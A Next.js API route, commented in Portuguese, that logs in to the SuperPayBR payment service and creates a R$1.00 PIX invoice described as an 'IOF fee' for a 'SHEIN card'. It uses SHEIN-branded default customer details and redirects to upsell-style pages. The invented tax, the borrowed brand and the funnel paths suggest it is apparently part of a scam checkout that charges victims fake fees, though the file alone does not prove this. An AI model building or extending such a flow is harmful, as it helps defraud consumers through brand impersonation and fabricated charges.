import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("📊 === CRIANDO FATURA IOF SUPERPAYBR ===")

    const body = await request.json()
    const amount = 1.0 // Valor fixo para IOF

    // Credenciais SuperPayBR
    const token = process.env.SUPERPAY_TOKEN
    const secretKey = process.env.SUPERPAY_SECRET_KEY
    const apiUrl = process.env.SUPERPAY_API_URL

    if (!token || !secretKey || !apiUrl) {
      return NextResponse.json(
        {
          success: false,
          error: "Credenciais SuperPayBR não configuradas",
        },
        { status: 500 },
      )
    }

    // Gerar External ID único
    const externalId = `IOF_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`

    // Autenticação Basic Auth
    const credentials = `${token}:${secretKey}`
    const base64Credentials = Buffer.from(credentials).toString("base64")

    // Obter access token
    const authResponse = await fetch(`${apiUrl}/auth`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        Authorization: `Basic ${base64Credentials}`,
      },
      body: JSON.stringify({
        grant_type: "client_credentials",
      }),
    })

    if (!authResponse.ok) {
      throw new Error("Falha na autenticação SuperPayBR")
    }

    const authData = await authResponse.json()
    const accessToken = authData.access_token || authData.token

    if (!accessToken) {
      throw new Error("Access token não obtido")
    }

    // Dados da fatura IOF
    const invoiceData = {
      client: {
        name: body.customerName || "Cliente SHEIN",
        document: (body.customerCpf || "00000000000").replace(/\D/g, ""),
        email: body.customerEmail || "cliente@shein.com",
        phone: (body.customerPhone || "11999999999").replace(/\D/g, ""),
        address: {
          street: "Rua Principal",
          number: "123",
          neighborhood: "Centro",
          city: "São Paulo",
          state: "SP",
          zipcode: "01001000",
        },
        ip: request.headers.get("x-forwarded-for") || "127.0.0.1",
      },
      payment: {
        external_id: externalId,
        type: "pix",
        due_date: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        description: "Taxa IOF - Cartão SHEIN",
        amount: amount,
        webhook_url: process.env.SUPERPAY_WEBHOOK_URL,
        return_url: `${request.nextUrl.origin}/upp10`,
        cancel_url: `${request.nextUrl.origin}/upp/001`,
      },
    }

    // Criar fatura
    const createResponse = await fetch(`${apiUrl}/invoices`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        Authorization: `Bearer ${accessToken}`,
      },
      body: JSON.stringify(invoiceData),
    })

    if (!createResponse.ok) {
      throw new Error("Falha ao criar fatura IOF")
    }

    const responseData = await createResponse.json()

    // Extrair dados PIX
    let pixPayload = ""
    let qrCodeImage = ""
    let invoiceId = ""

    const findPixData = (obj: any): void => {
      if (!obj || typeof obj !== "object") return

      for (const [key, value] of Object.entries(obj)) {
        if ((key === "id" || key === "invoice_id") && typeof value === "string" && !invoiceId) {
          invoiceId = value
        }
        if (
          (key === "payload" || key === "pix_code" || key === "qrcode") &&
          typeof value === "string" &&
          value.length > 50
        ) {
          pixPayload = value
        }
        if ((key === "qrcode_image" || key === "qr_code" || key === "image") && typeof value === "string") {
          qrCodeImage = value
        }
        if (typeof value === "object" && value !== null) {
          findPixData(value)
        }
      }
    }

    findPixData(responseData)

    if (!pixPayload) {
      throw new Error("PIX payload não encontrado na resposta")
    }

    const qrCodeUrl =
      qrCodeImage || `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=300&format=png&margin=1`

    const response = {
      success: true,
      data: {
        id: invoiceId || externalId,
        invoice_id: invoiceId || externalId,
        external_id: externalId,
        pix: {
          payload: pixPayload,
          image: qrCodeUrl,
          qr_code: qrCodeUrl,
        },
        status: {
          code: 1,
          title: "Aguardando Pagamento",
          text: "pending",
        },
        valores: {
          bruto: Math.round(amount * 100),
          liquido: Math.round(amount * 100),
        },
        vencimento: {
          dia: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        },
        type: "real",
      },
    }

    console.log("✅ Fatura IOF SuperPayBR criada:", response.data.external_id)
    return NextResponse.json(response)
  } catch (error) {
    console.error("❌ Erro ao criar fatura IOF:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Erro ao criar fatura IOF SuperPayBR",
        details: error instanceof Error ? error.message : "Erro desconhecido",
      },
      { status: 500 },
    )
  }
}

export async function GET(request: NextRequest) {
  return NextResponse.json(
    {
      success: false,
      error: "Método GET não suportado. Use POST para criar fatura IOF.",
    },
    { status: 405 },
  )
}
